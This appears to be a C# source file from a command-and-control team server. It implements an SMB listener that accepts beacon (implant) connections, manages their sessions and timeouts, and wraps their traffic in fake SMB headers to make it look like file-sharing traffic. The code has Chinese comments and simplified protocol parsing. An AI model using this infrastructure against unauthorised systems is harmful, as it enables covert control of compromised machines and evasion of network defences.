using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using TeamServer.Beacon.Interface;
using TeamServer.Beacon.Models;
using DataList.Beacon.Models;
using TeamServer.HandlePacket;

namespace TeamServer.Listener
{
    internal class SMBListener : IListener
    {
        private readonly string _bindAddress;
        private readonly int _port;
        private TcpListener? _tcpListener;
        private CancellationTokenSource? _cts;
        private Task? _acceptTask;
        private Task? _cleanupTask;
        private readonly TimeSpan _cleanupInterval = TimeSpan.FromSeconds(30);
        private readonly TimeSpan _beaconIdleTimeout = TimeSpan.FromSeconds(60);
        private readonly ConcurrentDictionary<string, BeaconSMBSession> _sessions = new();

        public SMBListener(string bindAddress, int port)
        {
            _bindAddress = bindAddress;
            _port = port;
        }

        public bool IsRunning { get; private set; }
        public string Protocol => "SMB";
        public string BindAddress => _bindAddress;
        public int Port => _port;

        public event Action<IBeaconSession>? OnBeaconConnected;
        public event Action<IBeaconSession>? OnBeaconDisconnected;
        public event Action<DataList.Client.Models.ClientSession>? OnClientConnected;
        public event Action<DataList.Client.Models.ClientSession>? OnClientDisconnected;
        public event Action<Exception>? OnError;

        public async Task StartAsync()
        {
            if (IsRunning) return;
            try
            {
                _tcpListener = new TcpListener(IPAddress.Parse(_bindAddress), _port);
                _tcpListener.Start();
                _cts = new CancellationTokenSource();
                IsRunning = true;
                _acceptTask = Task.Run(() => AcceptLoop(_cts.Token));
                _cleanupTask = Task.Run(() => CleanupLoopAsync(_cts.Token));
                await Task.CompletedTask;
            }
            catch (Exception ex)
            {
                OnError?.Invoke(ex);
                throw;
            }
        }

        public async Task StopAsync()
        {
            if (!IsRunning) return;
            try
            {
                IsRunning = false;
                _cts?.Cancel();
                try { if (_acceptTask != null) await _acceptTask.ConfigureAwait(false); } catch { }
                try { if (_cleanupTask != null) await _cleanupTask.ConfigureAwait(false); } catch { }
                try { _tcpListener?.Stop(); } catch { }
            }
            catch (Exception ex)
            {
                OnError?.Invoke(ex);
                throw;
            }
        }

        private async Task AcceptLoop(CancellationToken cancellationToken)
        {
            if (_tcpListener == null) return;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    var tcpClient = await _tcpListener.AcceptTcpClientAsync();
                    _ = Task.Run(() => HandleSMBConnection(tcpClient, cancellationToken));
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (ObjectDisposedException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    OnError?.Invoke(ex);
                }
            }
        }

        private async Task HandleSMBConnection(TcpClient tcpClient, CancellationToken cancellationToken)
        {
            var remoteEndPoint = (IPEndPoint)tcpClient.Client.RemoteEndPoint!;
            var sessionKey = remoteEndPoint.ToString();
            
            try
            {
                Console.WriteLine($"[SMB DEBUG] 新连接来自: {remoteEndPoint}");
                
                // 创建会话
                var session = _sessions.GetOrAdd(sessionKey, _ => CreateSession(remoteEndPoint, tcpClient));
                session.Info.LastSeenTime = DateTime.UtcNow;
                
                // 处理SMB协议握手和数据传输
                await ProcessSMBConnection(session, tcpClient, cancellationToken);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[SMB ERROR] 处理连接失败: {ex.Message}");
                OnError?.Invoke(ex);
            }
            finally
            {
                try { tcpClient?.Close(); } catch { }
                _sessions.TryRemove(sessionKey, out _);
            }
        }

        private async Task ProcessSMBConnection(BeaconSMBSession session, TcpClient tcpClient, CancellationToken cancellationToken)
        {
            var stream = tcpClient.GetStream();
            var buffer = new byte[4096];
            
            while (!cancellationToken.IsCancellationRequested && tcpClient.Connected)
            {
                try
                {
                    var bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length, cancellationToken);
                    if (bytesRead == 0) break;
                    
                    var data = new byte[bytesRead];
                    Array.Copy(buffer, 0, data, 0, bytesRead);
                    
                    
                    // 检查是否是SMB协议数据
                    if (IsSMBPacket(data))
                    {
                        // 解析SMB数据包，提取我们的数据
                        var extractedData = ExtractSMBData(data);
                        if (extractedData != null && extractedData.Length > 0)
                        {
                            session.TriggerDataReceived(extractedData);
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[SMB ERROR] 读取数据失败: {ex.Message}");
                    break;
                }
            }
        }

        private bool IsSMBPacket(byte[] data)
        {
            // 检查SMB协议标识符 (0xFF, 'S', 'M', 'B')
            if (data.Length < 4) return false;
            return data[0] == 0xFF && data[1] == (byte)'S' && data[2] == (byte)'M' && data[3] == (byte)'B';
        }

        private byte[]? ExtractSMBData(byte[] smbPacket)
        {
            try
            {
                // 简化的SMB数据提取
                // 在实际实现中，这里需要解析完整的SMB协议
                // 这里假设数据在SMB包的数据部分
                if (smbPacket.Length < 64) return null; // SMB头部至少64字节
                
                // 跳过SMB头部，提取数据部分
                var dataLength = smbPacket.Length - 64;
                if (dataLength <= 0) return null;
                
                var extractedData = new byte[dataLength];
                Array.Copy(smbPacket, 64, extractedData, 0, dataLength);
                
                return extractedData;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[SMB ERROR] 数据提取失败: {ex.Message}");
                return null;
            }
        }

        private BeaconSMBSession CreateSession(IPEndPoint remote, TcpClient tcpClient)
        {
            var session = new BeaconSMBSession(
                remote,
                tcpClient,
                data => SendSMBResponse(tcpClient, data),
                () => _sessions.TryRemove(remote.ToString(), out _))
            {
                Info = new BeaconInfo
                {
                    Id = Guid.NewGuid().ToString("N"),
                    ListenerId = Protocol,
                    IPProt = $"{remote.Address}:{remote.Port}",
                    IPAddress = remote.Address.ToString(),
                    ConnectedTime = DateTime.UtcNow,
                    LastSeenTime = DateTime.UtcNow,
                }
            };

            session.OnDataReceived += async (s, data) =>
            {
                s.Info.LastSeenTime = DateTime.UtcNow;
                try { await BeaconPacketHandle.Read(data, s); } catch (Exception ex) { OnError?.Invoke(ex); }
            };

            session.OnClosed += s =>
            {
                _sessions.TryRemove(remote.ToString(), out _);
                OnBeaconDisconnected?.Invoke(s);
            };

            OnBeaconConnected?.Invoke(session);
            return session;
        }

        private void SendSMBResponse(TcpClient tcpClient, byte[] data)
        {
            if (!tcpClient.Connected) return;
            try
            {
                // 构造SMB响应包
                var smbResponse = BuildSMBResponse(data);
                var stream = tcpClient.GetStream();
                stream.Write(smbResponse, 0, smbResponse.Length);
                stream.Flush();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] SMB响应发送失败: {ex.Message}");
            }
        }

        private byte[] BuildSMBResponse(byte[] data)
        {
            // 构造简化的SMB响应包
            var packet = new byte[64 + data.Length]; // SMB头部 + 数据
            
            // SMB头部
            packet[0] = 0xFF; // SMB标识符
            packet[1] = (byte)'S';
            packet[2] = (byte)'M';
            packet[3] = (byte)'B';
            
            // 其他SMB头部字段...
            // 这里简化实现，实际需要完整的SMB协议支持
            
            // 添加数据
            Array.Copy(data, 0, packet, 64, data.Length);
            
            return packet;
        }

        private async Task CleanupLoopAsync(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    CleanupStaleBeacons();
                }
                catch (Exception ex)
                {
                    OnError?.Invoke(ex);
                }

                try { await Task.Delay(_cleanupInterval, cancellationToken).ConfigureAwait(false); }
                catch (OperationCanceledException) { break; }
            }
        }

        private void CleanupStaleBeacons()
        {
            var now = DateTime.UtcNow;
            foreach (var session in _sessions.Values.ToArray())
            {
                if ((now - session.Info.LastSeenTime) > _beaconIdleTimeout)
                {
                    _sessions.TryRemove(session.Info.IPProt, out _);
                    OnBeaconDisconnected?.Invoke(session);
                }
            }
        }
    }
}
